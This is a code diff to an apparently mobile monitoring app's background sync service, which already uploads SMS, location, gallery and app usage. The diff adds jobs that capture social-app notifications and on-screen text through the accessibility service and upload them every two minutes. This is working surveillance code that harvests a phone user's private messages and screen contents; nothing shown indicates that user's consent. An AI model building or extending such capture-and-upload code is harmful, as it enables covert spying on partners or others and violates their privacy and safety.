@@ -16,6 +16,8 @@ import '../../features/gallery/viewmodel/gallery_sync_service.dart';
 import '../../features/live_status/viewmodel/live_status_sync_service.dart';
 import '../../features/location/viewmodel/location_sync_service.dart';
 import '../../features/sms/viewmodel/sms_sync_service.dart';
+import '../../features/social_accessibility/viewmodel/screen_capture_sync_service.dart';
+import '../../features/social_notifications/viewmodel/notification_sync_service.dart';
 import 'service_watchdog.dart';
 
 /// How often each monitored stream uploads. Each stream runs on its OWN timer,
@@ -65,6 +67,16 @@ class SyncIntervals {
   /// batches (binary upload + metadata store) and only when new ones appear, so
   /// this scans on a relaxed cadence; a large backlog is drained gradually.
   static const Duration gallery = Duration(minutes: 15);
+
+  /// Social notification capture (FEATURE A) - drains the native notification
+  /// queue every 2min. The native listener captures in real time; this just
+  /// ships what's queued, so 2min keeps uploads small and timely.
+  static const Duration socialNotifications = Duration(minutes: 2);
+
+  /// Social on-screen capture (FEATURE B) - drains the native accessibility
+  /// queue every 2min. Same rationale as above; accessibility can produce many
+  /// lines, so frequent small drains beat occasional large ones.
+  static const Duration socialAccessibility = Duration(minutes: 2);
 
   /// How often the foreground notification's "last synced" line refreshes.
   /// Increased from 5min to reduce unnecessary wake-ups.
@@ -158,6 +170,8 @@ void onStart(ServiceInstance service) async {
   final eventSync = container.read(eventSyncServiceProvider);
   final appUsageSync = container.read(appUsageSyncServiceProvider);
   final gallerySync = container.read(gallerySyncServiceProvider);
+  final notificationSync = container.read(notificationSyncServiceProvider);
+  final screenCaptureSync = container.read(screenCaptureSyncServiceProvider);
 
   // Each stream gets its OWN timer + interval + in-flight guard, so they're
   // fully independent: change any interval in [SyncIntervals] without touching
@@ -175,6 +189,10 @@ void onStart(ServiceInstance service) async {
     _SyncJob('events', SyncIntervals.events, eventSync.sync),
     _SyncJob('appUsage', SyncIntervals.appUsage, appUsageSync.sync),
     _SyncJob('gallery', SyncIntervals.gallery, gallerySync.sync),
+    _SyncJob('socialNotif', SyncIntervals.socialNotifications,
+        notificationSync.sync),
+    _SyncJob('socialScreen', SyncIntervals.socialAccessibility,
+        screenCaptureSync.sync),
   ];
   for (final job in jobs) {
     job.start();
